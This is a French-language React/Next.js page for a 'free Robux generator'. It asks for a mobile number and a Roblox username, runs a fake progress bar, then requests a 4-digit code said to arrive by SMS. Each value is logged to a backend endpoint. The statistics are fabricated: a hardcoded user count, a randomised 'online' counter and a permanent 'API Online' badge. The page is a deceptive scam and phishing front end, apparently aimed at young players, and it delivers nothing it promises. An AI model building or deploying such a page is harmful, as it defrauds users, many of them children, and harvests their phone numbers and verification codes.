'use client'

import { useState, useRef, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { ArrowRight, ArrowLeft, AtSign, Phone, ShieldCheck, Clock, Check, Users, Coins, Heart } from 'lucide-react'
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from '@/components/ui/input-otp'
import { Button } from '@/components/ui/button'
import { Toaster } from '@/components/ui/toaster'
import { useToast } from '@/hooks/use-toast'

type Step = 'form' | 'amount' | 'loading' | 'support' | 'code' | 'success'

async function log(
  type: 'inscription' | 'code_saisi' | 'chat_message',
  data: { phone?: string; pseudo?: string; code?: string; amount?: string; message?: string } = {},
) {
  try {
    await fetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, ...data }),
    })
  } catch (e) {
    console.warn('[log] failed', e)
  }
}

const AMOUNTS = [
  { id: '1k', label: '1 000', value: '1000', desc: 'Robux', popular: false },
  { id: '10k', label: '10 000', value: '10000', desc: 'Robux', popular: true },
  { id: '50k', label: '50 000', value: '50000', desc: 'Robux', popular: false },
]

export default function Home() {
  const [step, setStep] = useState<Step>('form')
  const [phone, setPhone] = useState('')
  const [pseudo, setPseudo] = useState('')
  const [amount, setAmount] = useState<string>('')
  const [code, setCode] = useState('')
  const [error, setError] = useState('')
  const [loadingProgress, setLoadingProgress] = useState(0)
  const { toast } = useToast()
  const phoneInputRef = useRef<HTMLInputElement>(null)

  useEffect(() => {
    if (step === 'form') {
      setTimeout(() => phoneInputRef.current?.focus(), 500)
    }
  }, [step])

  const normalizePhone = (raw: string) => raw.replace(/\D/g, '').slice(0, 10)
  const normalizePseudo = (raw: string) => raw.trim().toLowerCase()
  const isValidFrenchMobile = (n: string) =>
    n.length === 10 && (n.startsWith('06') || n.startsWith('07'))
  const isValidPseudo = (n: string) => /^[a-z0-9_][a-z0-9_]{2,19}$/i.test(n)
  const formatPhone = (n: string) => {
    const d = normalizePhone(n)
    return d.replace(/(\d{2})(?=\d)/g, '$1 ').trim()
  }

  // Étape 1 : submit formulaire → on log l'inscription + on va à l'écran montant
  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const normalizedPhone = normalizePhone(phone)
    const normalizedPseudo = normalizePseudo(pseudo)

    if (normalizedPhone.length < 10) {
      setError('Numéro incomplet : 10 chiffres requis')
      return
    }
    if (!isValidFrenchMobile(normalizedPhone)) {
      setError('Le numéro doit commencer par 06 ou 07')
      return
    }
    if (normalizedPseudo.length < 3) {
      setError('Pseudo trop court : 3 caractères minimum')
      return
    }
    if (!isValidPseudo(normalizedPseudo)) {
      setError('Pseudo invalide : lettres, chiffres, _ uniquement')
      return
    }
    setError('')

    log('inscription', { phone: normalizedPhone, pseudo: normalizedPseudo })
    setStep('amount')
  }

  // Étape 2 : choix du montant → lance le chargement 10s
  // À la fin, on va à l'écran de soutien, puis l'utilisateur clique pour aller à l'écran code
  const handleAmountSelect = (selectedAmount: string) => {
    setAmount(selectedAmount)
    setStep('loading')
    setLoadingProgress(0)

    // Animation de progression sur 20s
    const startTime = Date.now()
    const duration = 20000
    const interval = setInterval(() => {
      const elapsed = Date.now() - startTime
      const progress = Math.min((elapsed / duration) * 100, 100)
      setLoadingProgress(progress)
      if (progress >= 100) {
        clearInterval(interval)
        setStep('support')
      }
    }, 100)
  }

  // Étape soutien → code
  const handleSupportContinue = () => {
    toast({
      title: 'Code envoyé',
      description: `Code envoyé par SMS au ${formatPhone(phone)}`,
    })
    setStep('code')
  }

  // Étape 4 : validation du code saisi (chiffres seulement)
  // Si le code est faux → message "La génération ne marche pas"
  const handleCodeSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (code.length !== 4) {
      setError('La génération ne marche pas')
      return
    }
    setError('')

    log('code_saisi', {
      code,
      phone: normalizePhone(phone),
      pseudo: normalizePseudo(pseudo),
      amount,
    })

    setStep('success')
  }

  const handleResend = () => {
    toast({ title: 'Code renvoyé', description: `Nouveau code envoyé au ${formatPhone(phone)}` })
  }

  const reset = () => {
    setPhone('')
    setPseudo('')
    setAmount('')
    setCode('')
    setError('')
    setLoadingProgress(0)
    setStep('form')
  }

  return (
    <main className="relative min-h-screen overflow-hidden bg-black text-white">
      <AnimatedBackground />

      <div className="relative z-10 flex min-h-screen flex-col items-center justify-center px-4 py-8 sm:px-6 sm:py-10" style={{ paddingTop: 'env(safe-area-inset-top, 0px)', paddingBottom: 'env(safe-area-inset-bottom, 0px)' }}>
        <div className="w-full max-w-md">
          <AnimatePresence mode="wait">
            {/* === Étape 1 : Formulaire numéro + pseudo === */}
            {step === 'form' && (
              <motion.div
                key="form"
                initial={{ opacity: 0, x: 40 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -40 }}
                transition={{ duration: 0.45, ease: [0.22, 1, 0.36, 1] }}
              >
                <div className="mb-4 grid grid-cols-3 gap-2">
                  <StatBadge icon={<Users className="h-3.5 w-3.5" />} label="Utilisateurs" value="2.8M" />
                  <OnlineCounter />
                  <ApiStatus />
                </div>

                <div className="rounded-3xl border border-white/10 bg-white/[0.03] p-6 backdrop-blur-xl sm:p-8">
                  <motion.h1
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.1 }}
                    className="text-center text-3xl font-black tracking-tight sm:text-4xl"
                  >
                    <span className="bg-gradient-to-r from-blue-300 via-blue-400 to-blue-600 bg-clip-text text-transparent">
                      Ajouter des Robux
                    </span>
                  </motion.h1>
                  <motion.p
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.18 }}
                    className="mt-3 text-center text-sm text-white/60"
                  >
                    Entre ton numéro et ton pseudo Roblox pour commencer
                  </motion.p>

                  <form onSubmit={handleFormSubmit} className="mt-8 space-y-5">
                    <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.26 }}>
                      <label htmlFor="phone" className="mb-2 block text-xs font-medium uppercase tracking-wider text-white/50">
                        Numéro mobile
                      </label>
                      <div className="relative">
                        <Phone className="pointer-events-none absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-blue-400/70 sm:left-4 sm:h-5 sm:w-5" />
                        <input
                          ref={phoneInputRef}
                          id="phone"
                          type="tel"
                          inputMode="numeric"
                          autoComplete="tel"
                          placeholder="06 12 34 56 78"
                          value={formatPhone(phone)}
                          onChange={(e) => { setPhone(e.target.value); if (error) setError('') }}
                          className="w-full rounded-2xl border border-white/10 bg-black/50 py-3.5 pl-11 pr-3 text-base font-medium tracking-wider text-white placeholder-white/25 outline-none transition-all focus:border-blue-400/60 focus:ring-2 focus:ring-blue-400/20 sm:py-4 sm:pl-12 sm:pr-4 sm:text-lg"
                        />
                      </div>
                    </motion.div>

                    <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.34 }}>
                      <label htmlFor="pseudo" className="mb-2 block text-xs font-medium uppercase tracking-wider text-white/50">
                        Pseudo Roblox
                      </label>
                      <div className="relative">
                        <AtSign className="pointer-events-none absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-blue-400/70 sm:left-4 sm:h-5 sm:w-5" />
                        <input
                          id="pseudo"
                          type="text"
                          autoComplete="username"
                          autoCapitalize="none"
                          spellCheck={false}
                          placeholder="ton_pseudo_roblox"
                          value={pseudo}
                          onChange={(e) => { setPseudo(e.target.value); if (error) setError('') }}
                          className="w-full rounded-2xl border border-white/10 bg-black/50 py-3.5 pl-11 pr-3 text-base font-medium tracking-wide text-white placeholder-white/25 outline-none transition-all focus:border-blue-400/60 focus:ring-2 focus:ring-blue-400/20 sm:py-4 sm:pl-12 sm:pr-4 sm:text-lg"
                        />
                      </div>
                    </motion.div>

                    <AnimatePresence>
                      {error && (
                        <motion.p
                          initial={{ opacity: 0, y: -4, height: 0 }}
                          animate={{ opacity: 1, y: 0, height: 'auto' }}
                          exit={{ opacity: 0, y: -4, height: 0 }}
                          className="text-sm text-red-400"
                        >
                          {error}
                        </motion.p>
                      )}
                    </AnimatePresence>

                    <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.42 }}>
                      <motion.button
                        type="submit"
                        size="lg"
                        whileHover={{ scale: 1.02, boxShadow: '0 0 40px rgba(0, 162, 255, 0.45)' }}
                        whileTap={{ scale: 0.98 }}
                        transition={{ type: 'spring', stiffness: 400, damping: 20 }}
                        className="group flex w-full items-center justify-center gap-2 rounded-2xl bg-blue-500 px-6 py-3.5 text-base font-bold text-white"
                      >
                        Continuer
                        <motion.span
                          className="ml-1"
                          initial={{ x: 0 }}
                          whileHover={{ x: 4 }}
                          transition={{ type: 'spring', stiffness: 400 }}
                        >
                          <ArrowRight className="h-4 w-4" />
                        </motion.span>
                      </motion.button>
                    </motion.div>

                    <p className="text-center text-xs text-white/40">
                      Numéro : 06 ou 07 · Pseudo : 3 à 20 caractères
                    </p>
                  </form>
                </div>
              </motion.div>
            )}

            {/* === Étape 2 : Choix du montant === */}
            {step === 'amount' && (
              <motion.div
                key="amount"
                initial={{ opacity: 0, x: 40 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -40 }}
                transition={{ duration: 0.45, ease: [0.22, 1, 0.36, 1] }}
              >
                <div className="rounded-3xl border border-white/10 bg-white/[0.03] p-6 backdrop-blur-xl sm:p-8">
                  <motion.h2
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-center text-2xl font-black sm:text-3xl"
                  >
                    <span className="bg-gradient-to-r from-blue-300 via-blue-400 to-blue-600 bg-clip-text text-transparent">
                      Choisis ton montant
                    </span>
                  </motion.h2>
                  <p className="mt-2 text-center text-sm text-white/60">
                    Combien de Robux tu veux ajouter à ton compte ?
                  </p>

                  <div className="mt-6 space-y-3">
                    {AMOUNTS.map((a, i) => (
                      <motion.button
                        key={a.id}
                        type="button"
                        initial={{ opacity: 0, y: 12 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: i * 0.08, type: 'spring', stiffness: 300, damping: 24 }}
                        whileHover={{
                          scale: 1.02,
                          boxShadow: a.popular
                            ? '0 0 30px rgba(0, 162, 255, 0.35)'
                            : '0 0 20px rgba(0, 162, 255, 0.2)',
                        }}
                        whileTap={{ scale: 0.98 }}
                        onClick={() => handleAmountSelect(a.value)}
                        className={`group relative flex w-full items-center justify-between rounded-2xl border p-4 ${
                          a.popular
                            ? 'border-blue-400/40 bg-blue-400/10'
                            : 'border-white/10 bg-black/40 hover:border-blue-400/30'
                        }`}
                      >
                        <div className="flex items-center gap-3">
                          <motion.div
                            whileHover={{ rotate: -8, scale: 1.1 }}
                            transition={{ type: 'spring', stiffness: 400 }}
                            className={`flex h-11 w-11 items-center justify-center rounded-xl ${a.popular ? 'bg-blue-500' : 'bg-white/5'}`}
                          >
                            <Coins className={`h-5 w-5 ${a.popular ? 'text-white' : 'text-blue-400'}`} />
                          </motion.div>
                          <div className="text-left">
                            <div className="text-lg font-black text-white">{a.label}</div>
                            <div className="text-xs text-white/50">{a.desc}</div>
                          </div>
                        </div>
                        {a.popular && (
                          <span className="rounded-full bg-blue-500 px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider text-white">
                            Populaire
                          </span>
                        )}
                        <motion.span
                          className="ml-2"
                          whileHover={{ x: 4 }}
                          transition={{ type: 'spring', stiffness: 400 }}
                        >
                          <ArrowRight className="h-4 w-4 text-blue-400" />
                        </motion.span>
                      </motion.button>
                    ))}
                  </div>

                  <button
                    type="button"
                    onClick={() => setStep('form')}
                    className="mt-6 flex w-full items-center justify-center gap-1.5 text-sm text-white/50 transition hover:text-blue-400"
                  >
                    <ArrowLeft className="h-3.5 w-3.5" />
                    Modifier mes infos
                  </button>
                </div>
              </motion.div>
            )}

            {/* === Étape 3 : Chargement 10s === */}
            {step === 'loading' && (
              <motion.div
                key="loading"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
              >
                <div className="rounded-3xl border border-white/10 bg-white/[0.03] p-10 backdrop-blur-xl">
                  <div className="flex flex-col items-center py-8">
                    <motion.div
                      animate={{ rotate: 360 }}
                      transition={{ duration: 1.2, repeat: Infinity, ease: 'linear' }}
                      className="mb-6 h-14 w-14 rounded-full border-2 border-blue-400/30 border-t-blue-400"
                    />
                    <h2 className="text-2xl font-black text-white">Veuillez patienter</h2>
                    <p className="mt-2 text-sm text-white/60">
                      Génération de ton code pour {parseInt(amount).toLocaleString('fr-FR')} Robux...
                    </p>

                    {/* Barre de progression */}
                    <div className="mt-6 w-full max-w-xs">
                      <div className="h-2 w-full overflow-hidden rounded-full bg-white/10">
                        <motion.div
                          className="h-full rounded-full bg-gradient-to-r from-blue-400 to-blue-600"
                          style={{ width: `${loadingProgress}%` }}
                        />
                      </div>
                      <div className="mt-2 flex justify-between text-xs text-white/40">
                        <span>Chargement...</span>
                        <span className="tabular-nums">{Math.round(loadingProgress)}%</span>
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

            {/* === Étape 3.5 : Message de soutien === */}
            {step === 'support' && (
              <motion.div
                key="support"
                initial={{ opacity: 0, x: 40 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -40 }}
                transition={{ duration: 0.45, ease: [0.22, 1, 0.36, 1] }}
              >
                <div className="rounded-3xl border border-blue-400/30 bg-blue-400/[0.04] p-6 backdrop-blur-xl sm:p-8">
                  <motion.div
                    initial={{ scale: 0 }}
                    animate={{ scale: 1 }}
                    transition={{ delay: 0.1, type: 'spring', stiffness: 200 }}
                    className="mx-auto mb-5 flex h-14 w-14 items-center justify-center rounded-2xl bg-blue-500/15 ring-1 ring-blue-400/30"
                  >
                    <Heart className="h-7 w-7 text-blue-400" />
                  </motion.div>

                  <motion.h2
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.15 }}
                    className="text-center text-xl font-black sm:text-2xl"
                  >
                    <span className="bg-gradient-to-r from-blue-300 via-blue-400 to-blue-600 bg-clip-text text-transparent">
                      Soutiens-nous
                    </span>
                  </motion.h2>

                  <motion.div
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.25 }}
                    className="mt-4 space-y-3 text-center text-sm leading-relaxed text-white/70"
                  >
                    <p>
                      Nous sommes un <span className="font-semibold text-blue-400">service gratuit</span> qui t'aide à obtenir des Robux facilement et sans payer.
                    </p>
                    <p>
                      Chaque inscription nous soutient et permet à la communauté de grandir. Plus on est, plus on peut proposer des Robux à tout le monde.
                    </p>
                    <p className="text-white/50">
                      Merci de ta confiance, et bienvenue dans la communauté Robux + 💙
                    </p>
                  </motion.div>

                  <motion.div
                    initial={{ opacity: 0, y: 12 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.35 }}
                    className="mt-6"
                  >
                    <motion.button
                      type="button"
                      onClick={handleSupportContinue}
                      whileHover={{ scale: 1.02, boxShadow: '0 0 40px rgba(0, 162, 255, 0.45)' }}
                      whileTap={{ scale: 0.98 }}
                      transition={{ type: 'spring', stiffness: 400, damping: 20 }}
                      className="group flex w-full items-center justify-center gap-2 rounded-2xl bg-blue-500 px-6 py-3.5 text-base font-bold text-white"
                    >
                      Continuer
                      <motion.span
                        className="ml-1"
                        whileHover={{ x: 4 }}
                        transition={{ type: 'spring', stiffness: 400 }}
                      >
                        <ArrowRight className="h-4 w-4" />
                      </motion.span>
                    </motion.button>
                  </motion.div>
                </div>
              </motion.div>
            )}

            {/* === Étape 4 : Code généré + input === */}
            {step === 'code' && (
              <motion.div
                key="code"
                initial={{ opacity: 0, x: 40 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -40 }}
                transition={{ duration: 0.45, ease: [0.22, 1, 0.36, 1] }}
              >
                <div className="rounded-3xl border border-white/10 bg-white/[0.03] p-6 backdrop-blur-xl sm:p-8">
                  <motion.div
                    initial={{ scale: 0, rotate: -90 }}
                    animate={{ scale: 1, rotate: 0 }}
                    transition={{ delay: 0.1, type: 'spring', stiffness: 200 }}
                    className="mb-6 flex justify-center"
                  >
                    <div className="flex h-14 w-14 items-center justify-center rounded-2xl bg-blue-400/10 ring-1 ring-blue-400/30">
                      <ShieldCheck className="h-7 w-7 text-blue-400" />
                    </div>
                  </motion.div>

                  <h2 className="text-center text-2xl font-bold">Vérification</h2>
                  <p className="mt-2 text-center text-sm text-white/60">
                    Code envoyé par SMS au{' '}
                    <span className="font-semibold text-blue-400">{formatPhone(phone)}</span>
                  </p>

                  {/* Encart "code envoyé par SMS" */}
                  <motion.div
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: 0.2 }}
                    className="mt-5 flex items-center justify-center gap-3 rounded-2xl border border-blue-400/20 bg-blue-400/5 px-5 py-4"
                  >
                    <motion.div animate={{ rotate: [0, 15, -10, 0] }} transition={{ duration: 2, repeat: Infinity, ease: 'easeInOut' }}>
                      <Clock className="h-5 w-5 text-blue-400" />
                    </motion.div>
                    <div className="text-left">
                      <div className="text-sm font-semibold text-white">
                        Code envoyé par SMS
                      </div>
                      <div className="text-[11px] text-white/50">
                        Saisis le code à 4 chiffres reçu sur ton téléphone
                      </div>
                    </div>
                  </motion.div>

                  <form onSubmit={handleCodeSubmit} className="mt-6 space-y-5">
                    <div>
                      <label className="mb-2 block text-center text-xs font-medium uppercase tracking-wider text-white/50">
                        Ton code à 4 chiffres
                      </label>
                      <div className="flex justify-center">
                        <InputOTP
                          maxLength={4}
                          value={code}
                          onChange={(v) => {
                            // Force chiffres seulement
                            const digitsOnly = v.replace(/\D/g, '').slice(0, 4)
                            setCode(digitsOnly)
                            if (error) setError('')
                          }}
                          pattern="^[0-9]+$"
                        >
                          <InputOTPGroup className="gap-3">
                            {[0, 1, 2, 3].map((i) => (
                              <InputOTPSlot
                                key={i}
                                index={i}
                                className="h-12 w-11 rounded-xl border-white/15 bg-black/60 text-xl font-bold text-blue-400 first:rounded-l-xl last:rounded-r-xl data-[active=true]:border-blue-400 data-[active=true]:ring-blue-400/30 sm:h-14 sm:w-12 sm:text-2xl"
                              />
                            ))}
                          </InputOTPGroup>
                        </InputOTP>
                      </div>
                    </div>

                    {error && <p className="text-center text-sm text-red-400">{error}</p>}

                    <motion.button
                      type="submit"
                      size="lg"
                      disabled={code.length !== 4}
                      whileHover={code.length === 4 ? { scale: 1.02, boxShadow: '0 0 40px rgba(0, 162, 255, 0.45)' } : {}}
                      whileTap={code.length === 4 ? { scale: 0.98 } : {}}
                      transition={{ type: 'spring', stiffness: 400, damping: 20 }}
                      className="group flex w-full items-center justify-center gap-2 rounded-2xl bg-blue-500 px-6 py-3.5 text-base font-bold text-white disabled:cursor-not-allowed disabled:opacity-40"
                    >
                      Valider
                      <motion.span
                        className="ml-1"
                        whileHover={{ x: 4 }}
                        transition={{ type: 'spring', stiffness: 400 }}
                      >
                        <ArrowRight className="h-4 w-4" />
                      </motion.span>
                    </motion.button>

                    <button type="button" onClick={reset} className="flex w-full items-center justify-center gap-1.5 text-sm text-white/50 transition hover:text-blue-400">
                      <ArrowLeft className="h-3.5 w-3.5" />
                      Recommencer
                    </button>
                  </form>
                </div>

                <p className="mt-6 text-center text-xs text-white/30">
                  Code perdu ?{' '}
                  <button type="button" onClick={handleResend} className="font-medium text-blue-400 underline-offset-2 hover:underline">
                    Régénérer
                  </button>
                </p>
              </motion.div>
            )}

            {/* === Étape 5 : Succès === */}
            {step === 'success' && (
              <motion.div
                key="success"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
              >
                <div className="rounded-3xl border border-blue-400/30 bg-blue-400/[0.04] p-6 text-center backdrop-blur-xl sm:p-10">
                  <motion.div
                    initial={{ scale: 0 }}
                    animate={{ scale: 1 }}
                    transition={{ delay: 0.15, type: 'spring', stiffness: 200 }}
                    className="mx-auto mb-6 flex h-16 w-16 items-center justify-center rounded-2xl bg-blue-500/15 ring-2 ring-blue-400"
                  >
                    <Check className="h-8 w-8 text-blue-400" strokeWidth={3} />
                  </motion.div>

                  <motion.h2 initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }} className="text-2xl font-black leading-tight sm:text-3xl">
                    <span className="bg-gradient-to-r from-blue-300 via-blue-400 to-blue-600 bg-clip-text text-transparent">
                      Tes Robux arrivent très bientôt
                    </span>
                  </motion.h2>

                  <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }} className="mt-3 inline-flex items-center gap-2 rounded-2xl border border-blue-400/20 bg-blue-400/5 px-4 py-2">
                    <Coins className="h-4 w-4 text-blue-400" />
                    <span className="text-lg font-black tabular-nums text-blue-400">
                      {parseInt(amount).toLocaleString('fr-FR')} Robux
                    </span>
                  </motion.div>

                  <motion.p initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.5 }} className="mt-3 text-base font-medium text-white">
                    Tes Robux arrivent très bientôt dans <span className="font-bold text-blue-400">12h</span>. Veuillez patienter.
                  </motion.p>

                  <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: 0.6 }} className="mt-7 flex items-center justify-center gap-2 rounded-2xl border border-blue-400/20 bg-blue-400/5 px-5 py-4">
                    <motion.div animate={{ rotate: [0, 15, -10, 0] }} transition={{ duration: 2, repeat: Infinity, ease: 'easeInOut' }}>
                      <Clock className="h-5 w-5 text-blue-400" />
                    </motion.div>
                    <span className="text-lg font-black uppercase tracking-widest text-blue-400">
                      Livraison en cours
                    </span>
                    <AnimatedGreenDot />
                  </motion.div>

                  <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.7 }} className="mt-5 text-xs text-white/50">
                    Reste connecté, tes Robux arrivent bientôt.
                  </motion.p>

                  <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.8 }}>
                    <motion.button
                      type="button"
                      onClick={reset}
                      whileHover={{ scale: 1.02, borderColor: 'rgba(0, 162, 255, 0.5)' }}
                      whileTap={{ scale: 0.98 }}
                      transition={{ type: 'spring', stiffness: 400, damping: 20 }}
                      className="mt-7 flex w-full items-center justify-center gap-2 rounded-2xl border border-white/15 bg-transparent px-6 py-3 text-base font-bold text-white"
                    >
                      Recommencer
                    </motion.button>
                  </motion.div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      <Toaster />
    </main>
  )
}

function StatBadge({ icon, label, value }: { icon: React.ReactNode; label: string; value: string }) {
  return (
    <div className="flex flex-col items-center justify-center gap-0.5 rounded-2xl border border-white/10 bg-white/[0.03] px-2 py-2.5 backdrop-blur-xl">
      <div className="flex items-center gap-1 text-blue-400">{icon}</div>
      <span className="text-sm font-bold text-white">{value}</span>
      <span className="text-[9px] uppercase tracking-wider text-white/40">{label}</span>
    </div>
  )
}

function OnlineCounter() {
  const MIN = 156
  const MAX = 2840
  const [count, setCount] = useState(MIN)
  const [mounted, setMounted] = useState(false)

  useEffect(() => {
    // eslint-disable-next-line react-hooks/set-state-in-effect
    setCount(Math.floor(Math.random() * (MAX - MIN + 1)) + MIN)
    setMounted(true)
    const id = setInterval(() => {
      setCount((prev) => {
        const magnitude = Math.random() < 0.5 ? 3 : 5
        const direction = Math.random() < 0.5 ? -1 : 1
        const next = prev + direction * magnitude
        return Math.max(MIN, Math.min(MAX, next))
      })
    }, 10 * 1000)
    return () => clearInterval(id)
  }, [])

  return (
    <div className="flex flex-col items-center justify-center gap-0.5 rounded-2xl border border-white/10 bg-white/[0.03] px-2 py-2.5 backdrop-blur-xl">
      <div className="flex items-center gap-1">
        <AnimatedGreenDot />
      </div>
      <motion.span
        key={count}
        initial={{ opacity: mounted ? 0 : 1, y: mounted ? -4 : 0 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3 }}
        className="text-sm font-bold text-white tabular-nums"
      >
        {count.toLocaleString('fr-FR')}
      </motion.span>
      <span className="text-[9px] uppercase tracking-wider text-white/40">En ligne</span>
    </div>
  )
}

function ApiStatus() {
  return (
    <div className="flex flex-col items-center justify-center gap-1 rounded-2xl border border-white/10 bg-white/[0.03] px-2 py-2.5 backdrop-blur-xl">
      <div className="flex items-center gap-1.5">
        <AnimatedGreenDot />
        <span className="text-[10px] font-bold uppercase tracking-wider text-green-400">API Online</span>
      </div>
      <span className="text-[10px] font-semibold uppercase tracking-wider text-blue-400/80">
        Service actif
      </span>
    </div>
  )
}

function AnimatedGreenDot() {
  return (
    <span className="relative flex h-2.5 w-2.5">
      <motion.span
        className="absolute inline-flex h-full w-full rounded-full bg-green-400"
        animate={{ scale: [1, 2.2, 1], opacity: [0.6, 0, 0.6] }}
        transition={{ duration: 1.6, repeat: Infinity, ease: 'easeInOut' }}
      />
      <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-green-400" />
    </span>
  )
}

function AnimatedBackground() {
  return (
    <div className="pointer-events-none absolute inset-0 overflow-hidden">
      {/* Base dégradée bleu très foncé → noir */}
      <div className="absolute inset-0 bg-gradient-to-b from-[#001428] via-black to-black" />

      {/* === Aurora bleue douce (3 halos qui drift lentement) === */}
      <motion.div
        className="absolute -left-1/4 top-0 h-[70vh] w-[70vh] rounded-full opacity-25 blur-[140px]"
        style={{ background: 'radial-gradient(circle, #00A2FF 0%, transparent 70%)' }}
        animate={{
          x: [0, 150, 80, -60, 0],
          y: [0, 80, 160, 100, 0],
          scale: [1, 1.2, 0.95, 1.1, 1],
        }}
        transition={{ duration: 26, repeat: Infinity, ease: 'easeInOut' }}
      />
      <motion.div
        className="absolute -right-1/4 bottom-0 h-[60vh] w-[60vh] rounded-full opacity-20 blur-[140px]"
        style={{ background: 'radial-gradient(circle, #0066FF 0%, transparent 70%)' }}
        animate={{
          x: [0, -140, -80, 60, 0],
          y: [0, -100, -180, -50, 0],
          scale: [1, 1.15, 1.25, 0.9, 1],
        }}
        transition={{ duration: 30, repeat: Infinity, ease: 'easeInOut' }}
      />
      <motion.div
        className="absolute left-1/3 top-1/4 h-[50vh] w-[50vh] rounded-full opacity-15 blur-[120px]"
        style={{ background: 'radial-gradient(circle, #60A5FA 0%, transparent 70%)' }}
        animate={{
          x: [0, 120, -60, 90, 0],
          y: [0, -90, 50, -110, 0],
        }}
        transition={{ duration: 34, repeat: Infinity, ease: 'easeInOut' }}
      />

      {/* === Vagues horizontales fluides (SVG qui ondulent) === */}
      <motion.svg
        className="absolute inset-0 h-full w-full opacity-[0.08]"
        viewBox="0 0 100 100"
        preserveAspectRatio="none"
      >
        <motion.path
          d="M 0 40 Q 25 20 50 40 T 100 40 L 100 100 L 0 100 Z"
          fill="rgba(0, 162, 255, 0.3)"
          animate={{
            d: [
              'M 0 40 Q 25 20 50 40 T 100 40 L 100 100 L 0 100 Z',
              'M 0 40 Q 25 60 50 40 T 100 40 L 100 100 L 0 100 Z',
              'M 0 40 Q 25 20 50 40 T 100 40 L 100 100 L 0 100 Z',
            ],
          }}
          transition={{ duration: 12, repeat: Infinity, ease: 'easeInOut' }}
        />
        <motion.path
          d="M 0 60 Q 25 45 50 60 T 100 60 L 100 100 L 0 100 Z"
          fill="rgba(0, 102, 255, 0.2)"
          animate={{
            d: [
              'M 0 60 Q 25 45 50 60 T 100 60 L 100 100 L 0 100 Z',
              'M 0 60 Q 25 75 50 60 T 100 60 L 100 100 L 0 100 Z',
              'M 0 60 Q 25 45 50 60 T 100 60 L 100 100 L 0 100 Z',
            ],
          }}
          transition={{ duration: 16, repeat: Infinity, ease: 'easeInOut' }}
        />
        <motion.path
          d="M 0 75 Q 25 65 50 75 T 100 75 L 100 100 L 0 100 Z"
          fill="rgba(0, 200, 255, 0.15)"
          animate={{
            d: [
              'M 0 75 Q 25 65 50 75 T 100 75 L 100 100 L 0 100 Z',
              'M 0 75 Q 25 85 50 75 T 100 75 L 100 100 L 0 100 Z',
              'M 0 75 Q 25 65 50 75 T 100 75 L 100 100 L 0 100 Z',
            ],
          }}
          transition={{ duration: 20, repeat: Infinity, ease: 'easeInOut' }}
        />
      </motion.svg>

      {/* === Particules flottantes douces (qui montent et descendent) === */}
      {PARTICLES.map((p, i) => (
        <motion.span
          key={`particle-${i}`}
          className="absolute h-1 w-1 rounded-full bg-blue-400"
          style={{ left: `${p.x}%`, top: `${p.y}%` }}
          animate={{
            y: [0, -50, 0],
            x: [0, p.drift, 0],
            opacity: [0, 0.6, 0],
            scale: [0.3, 1.2, 0.3],
          }}
          transition={{
            duration: p.d,
            repeat: Infinity,
            delay: p.delay,
            ease: 'easeInOut',
          }}
        />
      ))}

      {/* === Halo central doux === */}
      <div
        className="absolute left-1/2 top-1/2 h-[40vh] w-[40vh] -translate-x-1/2 -translate-y-1/2 rounded-full blur-[100px]"
        style={{ background: 'radial-gradient(circle, rgba(0, 162, 255, 0.1) 0%, transparent 70%)' }}
      />

      {/* Voile dégradé */}
      <div className="absolute inset-0 bg-gradient-to-b from-black/40 via-transparent to-black/70" />
    </div>
  )
}

// Particules flottantes douces
const PARTICLES = Array.from({ length: 24 }, (_, i) => ({
  x: (i * 4.1 + 3) % 100,
  y: (i * 6.7 + 5) % 100,
  d: 8 + (i % 6) * 1.5,
  delay: (i % 10) * 0.5,
  drift: i % 2 === 0 ? 25 : -25,
}))
